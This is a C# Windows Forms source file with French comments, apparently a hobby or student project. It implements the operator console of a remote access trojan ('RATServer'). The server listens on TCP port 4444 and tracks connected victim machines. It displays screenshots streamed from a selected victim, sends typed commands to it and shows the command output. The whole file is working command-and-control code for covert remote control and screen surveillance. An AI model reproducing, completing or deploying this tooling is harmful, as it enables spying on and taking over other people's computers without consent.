using Global;
using System;  // Utilisé pour les types de données de base, les exceptions, les manipulations de chaînes, etc. (erreur+environement)
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;  // Pour manipuler les images et les graphiques
using System.Drawing.Imaging;
using System.IO;  // Pour gérer les flux de données (par exemple, lire et écrire des fichiers)
using System.Net;  // Pour utiliser les fonctionnalités réseau, notamment TCP/IP
using System.Net.Sockets;  // Pour manipuler les connexions TCP via les sockets
using System.Text;
using System.Threading;  // Pour exécuter des tâches asynchrones dans des threads séparés
using System.Windows.Forms;  // Pour créer l'interface graphique sous Windows


namespace RATWinFormApp1
{
    public class RATServer : Form
    {

        // Déclaration de composants de l'interface graphique
        private ListView listViewClients;  // Liste pour afficher les clients connectés
        private PictureBox pictureBox;  // Zone pour afficher l'écran du client sélectionné
        private Label terminal; //lable pour afficher normalement les message en console

        private TcpListener server;  // Serveur TCP pour écouter les connexions entrantes
        private readonly List<TcpClient> clients;  // Liste de tous les clients connectés
        private TcpClient client = null; //un client

        private readonly List<NetworkStream> streams;  // Liste des flux réseau pour chaque client
        private NetworkStream stream; //flux du client
        private readonly Thread listenThread;  // Thread pour écouter les connexions clients de manière asynchrone
        private TextBox txtCommand;
        private Button btnSendCommand;
        private Panel panel1;
        ListViewItem previousSelected;

        //int jack = 1;


        public RATServer()
        {
            InitializeComponent();
            Init();

            // Démarrage d'un thread pour écouter les connexions entrantes des clients
            listenThread = new Thread(new ThreadStart(StartServer))
            {
                IsBackground = true // Exécution en tâche de fond
            };
            listenThread.Start(); // Démarrage du thread d'écoute

            clients = new List<TcpClient>();
            streams = new List<NetworkStream>();

            // Gestion de la fermeture de la fenêtre
            this.FormClosing += new FormClosingEventHandler(OnFormClosing);
        }

        private void Init()
        {
            // Événement déclenché quand un client est sélectionné
            listViewClients.SelectedIndexChanged += ListViewClients_SelectedIndexChanged;
            btnSendCommand.Click += BtnSendCommand_Click;
            this.Load += BackgroundTask;
        }

        /// <summary>
        /// tache fait en arriere plans permetant d'afficher la fenetre avant la fin
        /// </summary>
        /// <param name="sender">object qui a declencher l'event</param>
        /// <param name="e">information lieu a l'event</param>
        private void BackgroundTask(object sender, EventArgs e)
        {
            BackgroundWorker worker = new BackgroundWorker(); //permet d'exécuter des tâches en arrière-plan sans bloquer l'interface utilisateur
            worker.DoWork += (s, args) => Always();  //processus a lancer
            worker.RunWorkerAsync(); //lance le processus
        }

        /// <summary>
        /// tjr appeler et ne sarrete jamais
        /// </summary>
        private void Always()
        {
            while (true)
            {
                pictureBox.Size = ClientSize - new Size(120, 170);
                if (listViewClients.SelectedItems.Count == 0)
                {
                    pictureBox.Image = ResizeImage(Properties.Resources.nothing, pictureBox.Width, pictureBox.Height);
                }
            }
        }

        /// <summary>
        /// lance le server
        /// </summary>
        private void StartServer()
        {
            try
            {
                // Création du serveur pour écouter les connexions TCP sur le port 4444
                server = new TcpListener(IPAddress.Any, 4444);
                server.Start(); //demarge du serv

                while (true)
                {
                    terminal.Text += "En attente de connexion...\n";
                    try
                    {
                        client = server.AcceptTcpClient(); // Attente d'une connexion client
                        clients.Add(client);  // Ajout du client à la liste des clients connectés

                        terminal.Text += "Client connecté !\n";

                        stream = client.GetStream(); // Récupération du flux réseau pour ce client
                        streams.Add(stream);  // Ajout du flux à la liste des flux

                        // Ajout du client à la ListView avec l'adresse IP du client
                        string clientName = client.Client.RemoteEndPoint.ToString();  // Récupération de l'adresse IP du client
                        listViewClients.Invoke(new MethodInvoker(delegate { listViewClients.Items.Add(clientName); }));  // Mise à jour de la ListView sur le thread principal

                        // Démarrage d'un thread pour gérer la communication avec ce client
                        Thread clientThread = new Thread(() => HandleClient(client, stream))
                        {
                            IsBackground = true  // Exécution en tâche de fond
                        };
                        clientThread.Start();  // Démarrage du thread de gestion du client
                    }
                    catch (Exception ex)
                    {
                        foreach (var client in clients)
                        {
                            client.Close();  // Fermeture de chaque client
                        }
                        server.Stop();
                        terminal.Text += "Erreur : " + ex.Message + "\n";
                    }
                }
            }
            catch (Exception ex)
            {
                terminal.Text += "Erreur Serveur : " + ex.Message + "\n";
            }
        }

        /// <summary>
        /// redimensionne l'image pour s'adapter a la bonne taille
        /// </summary>
        /// <param name="img">l'image en question</param>
        /// <param name="width">la largeur de la nouvelle image</param>
        /// <param name="height">la hauteur de la nouvelle image</param>
        /// <returns>la nouvelle image</returns>
        private Image ResizeImage(Image img, int width, int height)
        {
            //cree une nouvelle image
            Bitmap resizedImg = new Bitmap(width, height);
            using (Graphics gfx = Graphics.FromImage(resizedImg))
            {
                //defini la qualiter
                gfx.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;

                //redimentionne l'image
                gfx.DrawImage(img, 0, 0, width, height);
            }
            return resizedImg;
        }

        /// <summary>
        /// gérer la communication avec un client spécifique
        /// </summary>
        /// <param name="client">le client</param>
        /// <param name="stream"></param>
        private void HandleClient(TcpClient client, NetworkStream stream)
        {
            try
            {
                string clientName = client.Client.RemoteEndPoint.ToString(); // Obtenir l'adresse du client
                // Boucle pour recevoir des données tant que le client est connecté
                while (client.Connected)
                {
                    byte[] buffer = new byte[3];
                    int bytesRead = stream.Read(buffer, 0, buffer.Length);

                    if (bytesRead > 0)
                    {
                        string prefix = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                        // Vérifier si c'est une capture d'écran (binaire) ou un texte (réponse de commande)
                        if (prefix == Fonction.Prefix.CMD.ToString())
                        {
                            byte[] sizeBuffer = new byte[4];  // Buffer pour lire la taille de l'image envoyée
                            stream.Read(sizeBuffer, 0, sizeBuffer.Length);  // Lecture de la taille
                            int size = BitConverter.ToInt32(sizeBuffer, 0);  // Conversion en entier

                            byte[] reponse = new byte[size];  // Tableau pour contenir les données de l'image

                            bytesRead = 0;
                            // Lecture des données de l'image
                            //pas juste stream.Read pour etre sur de tout lire
                            while (bytesRead < size)
                            {
                                // Lire les données du flux
                                bytesRead += stream.Read(reponse, bytesRead, size - bytesRead);
                            }

                            terminal.Text += $"{listViewClients.SelectedItems[0].Text}:\n";
                            terminal.Text += Encoding.UTF8.GetString(reponse, 0, bytesRead).Trim() + "\n";
                        }
                        else if (prefix == Fonction.Prefix.IMG.ToString())
                        {
                            byte[] sizeBuffer = new byte[4];  // Buffer pour lire la taille de l'image envoyée
                            stream.Read(sizeBuffer, 0, sizeBuffer.Length);  // Lecture de la taille de l'image
                            int imageSize = BitConverter.ToInt32(sizeBuffer, 0);  // Conversion de la taille en entier

                            byte[] imageData = new byte[imageSize];  // Tableau pour contenir les données de l'image
                            bytesRead = 0;
                            // Lecture des données de l'image
                            while (bytesRead < imageSize)
                            {
                                // Lire les données du flux
                                bytesRead += stream.Read(imageData, bytesRead, imageSize - bytesRead);
                            }
                            using (MemoryStream ms = new MemoryStream(imageData))
                            {
                                Image img = Image.FromStream(ms);

                                listViewClients.Invoke(new MethodInvoker(delegate
                                {
                                    if (listViewClients.SelectedItems.Count > 0 &&
                                        listViewClients.SelectedItems[0].Text == clientName)
                                    {
                                        pictureBox.Image = ResizeImage(img, pictureBox.Width, pictureBox.Height);
                                    }
                                }));
                            }
                        }
                    }
                    else
                    {
                        break;
                    }
                    /*
                    byte[] sizeBuffer = new byte[4];  // Buffer pour lire la taille de l'image envoyée
                        stream.Read(sizeBuffer, 0, sizeBuffer.Length);  // Lecture de la taille de l'image
                        int imageSize = BitConverter.ToInt32(sizeBuffer, 0);  // Conversion de la taille en entier

                        byte[] imageData = new byte[imageSize];  // Tableau pour contenir les données de l'image
                        int bytesRead = 0;
                        // Lecture des données de l'image
                        while (bytesRead < imageSize)
                    {
                        // Lire les données du flux
                        bytesRead += stream.Read(imageData, bytesRead, imageSize - bytesRead);
                    }
                    /*
                    if (jack == 1)
                    {
                        string filePath = $"C:/Users/Nico/Pictures/screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.jpg";
                        File.WriteAllBytes(filePath, imageData);
                        terminal.Text += $"Capture d'écran enregistrée : {filePath}";
                        jack = 0;
                    }

                    // Conversion des données de l'image en objet Image
                    using (MemoryStream ms = new MemoryStream(imageData))
                    {
                        // Créer l'image depuis le flux de données
                        Image img = Image.FromStream(ms);
                        // Vérifier si ce client est bien le client sélectionné avant d'afficher l'image
                        listViewClients.Invoke(new MethodInvoker(delegate
                        {
                            if (listViewClients.SelectedItems.Count > 0 &&
                                listViewClients.SelectedItems[0].Text == clientName)
                            {
                                pictureBox.Image = ResizeImage(img, pictureBox.Width, pictureBox.Height);
                            }
                        }));
                        // Mise à jour de l'image affichée dans la PictureBox
                        //pictureBox.Invoke(new MethodInvoker(delegate { pictureBox.Image = ResizeImage(img, pictureBox.Width, pictureBox.Height); }));
                    }*/

                }
            }
            catch (Exception ex)
            {
                terminal.Text += "Erreur Client : " + ex.Message + "\n";
            }
            finally
            {
                terminal.Text += $"{client.Client.RemoteEndPoint.ToString()} s'est deconnecter.\n";
                RemoveClientFromList(client);
            }
        }

        /// <summary>
        /// suprime les client inactif de la liste
        /// </summary>
        /// <param name="client">le client a supprimer</param>
        private void RemoveClientFromList(TcpClient client)
        {
            listViewClients.Invoke(new MethodInvoker(delegate
            {
                // Rechercher l'élément dans la ListView
                foreach (ListViewItem item in listViewClients.Items)
                {
                    if (item.Text == client.Client.RemoteEndPoint.ToString())
                    {
                        // Supprimer l'élément de la ListView
                        listViewClients.Items.Remove(item);
                        break;
                    }
                }
            }));
        }

        /// <summary>
        /// appelée lorsque l'utilisateur sélectionne un client dans la ListView
        /// </summary>
        /// <param name="sender">object qui a declencher l'event</param>
        /// <param name="e">information lieu a l'event</param>
        private void ListViewClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (listViewClients.SelectedItems.Count > 0)
            {
                if (listViewClients.SelectedItems[0] != previousSelected)
                {
                    previousSelected = listViewClients.SelectedItems[0]; //stock lancien client deja selectionner

                    string selectedClient = listViewClients.SelectedItems[0].Text; // Récupération du nom du client sélectionné
                    int clientIndex = listViewClients.Items.IndexOf(listViewClients.SelectedItems[0]); // Index du client
                    NetworkStream selectedStream = streams[clientIndex]; // Récupération du flux réseau associé au client sélectionné

                    terminal.Text += $"Client sélectionné : {selectedClient}\n";

                    // À ce stade, vous pouvez interagir avec le client sélectionné
                }
            }
            else
            {
                pictureBox.Size = ClientSize - new Size(120, 170);
                pictureBox.Image = ResizeImage(Properties.Resources.nothing, pictureBox.Width, pictureBox.Height);
            }
        }

        /// <summary>
        /// envoie les commande au serveur
        /// </summary>
        /// <param name="sender">object qui a declencher l'event</param>
        /// <param name="e">information lieu a l'event</param>
        private void BtnSendCommand_Click(object sender, EventArgs e)
        {
            if (listViewClients.SelectedItems.Count > 0)
            {
                int clientIndex = listViewClients.Items.IndexOf(listViewClients.SelectedItems[0]); //obtient la position du client
                NetworkStream selectedStream = streams[clientIndex]; //obtien le flux du client

                string command = txtCommand.Text.Trim(); //recup input + retire les espace inutile
                if (!string.IsNullOrEmpty(command)) //si y a une commande
                {
                    byte[] data = Encoding.UTF8.GetBytes(command); //encode la commande

                    Fonction.SendSize(data, stream); //envoie la taille de la commande

                    selectedStream.Write(data, 0, data.Length); //envoie la commande

                    txtCommand.Clear(); // Efface la commande après l'envoi
                }
            }
        }



        /// <summary>
        /// appeler lors de la fermeture de la fenetre
        /// </summary>
        /// <param name="sender">object qui a declencher l'event</param>
        /// <param name="e">information lieu a l'event</param>
        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            foreach (var client in clients)
            {
                // Effectuer un flush si nécessaire pour s'assurer que toutes les données sont envoyées
                stream.Flush();

                // Fermer proprement le stream et la connexion
                stream.Close();
                client.Close();  // Fermeture de chaque client
            }
            /*
            if (server != null)
            {
                server.Stop(); //arret du serv
            }*/

            server?.Stop();//arret du serv

            Environment.Exit(0); // Forcer la fermeture complète
        }

        //this.pictureBox.Dock = System.Windows.Forms.DockStyle.Fill;
        /// <summary>
        /// init tout les composant modifier par vs lui meme donc faire gaff
        /// </summary>
        private void InitializeComponent()
        {
            this.terminal = new System.Windows.Forms.Label();
            this.pictureBox = new System.Windows.Forms.PictureBox();
            this.listViewClients = new System.Windows.Forms.ListView();
            this.txtCommand = new System.Windows.Forms.TextBox();
            this.btnSendCommand = new System.Windows.Forms.Button();
            this.panel1 = new System.Windows.Forms.Panel();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).BeginInit();
            this.panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // terminal
            // 
            this.terminal.AutoSize = true;
            this.terminal.Location = new System.Drawing.Point(0, 0);
            this.terminal.Name = "terminal";
            this.terminal.Size = new System.Drawing.Size(94, 25);
            this.terminal.TabIndex = 0;
            this.terminal.Text = "terminal:\n";
            // 
            // pictureBox
            // 
            this.pictureBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.pictureBox.Image = global::RATWinFormApp1.Properties.Resources.nothing;
            this.pictureBox.Location = new System.Drawing.Point(10, 10);
            this.pictureBox.Name = "pictureBox";
            this.pictureBox.Size = new System.Drawing.Size(756, 361);
            this.pictureBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox.TabIndex = 1;
            this.pictureBox.TabStop = false;
            // 
            // listViewClients
            // 
            this.listViewClients.Dock = System.Windows.Forms.DockStyle.Right;
            this.listViewClients.HideSelection = false;
            this.listViewClients.Location = new System.Drawing.Point(774, 0);
            this.listViewClients.Name = "listViewClients";
            this.listViewClients.Size = new System.Drawing.Size(100, 529);
            this.listViewClients.TabIndex = 2;
            this.listViewClients.UseCompatibleStateImageBehavior = false;
            this.listViewClients.View = System.Windows.Forms.View.List;
            // 
            // txtCommand
            // 
            this.txtCommand.BackColor = System.Drawing.SystemColors.InactiveCaption;
            this.txtCommand.Location = new System.Drawing.Point(774, 468);
            this.txtCommand.Name = "txtCommand";
            this.txtCommand.Size = new System.Drawing.Size(100, 31);
            this.txtCommand.TabIndex = 3;
            // 
            // btnSendCommand
            // 
            this.btnSendCommand.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnSendCommand.Location = new System.Drawing.Point(774, 498);
            this.btnSendCommand.Name = "btnSendCommand";
            this.btnSendCommand.Size = new System.Drawing.Size(100, 31);
            this.btnSendCommand.TabIndex = 4;
            this.btnSendCommand.Text = "Send";
            this.btnSendCommand.UseVisualStyleBackColor = true;
            // 
            // panel1
            // 
            this.panel1.AutoScroll = true;
            this.panel1.Controls.Add(this.terminal);
            this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.panel1.Location = new System.Drawing.Point(0, 379);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(774, 150);
            this.panel1.TabIndex = 5;
            // 
            // RATServer
            // 
            this.ClientSize = new System.Drawing.Size(874, 529);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.btnSendCommand);
            this.Controls.Add(this.txtCommand);
            this.Controls.Add(this.listViewClients);
            this.Controls.Add(this.pictureBox);
            this.Name = "RATServer";
            this.Text = "Server";
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).EndInit();
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }
    }
}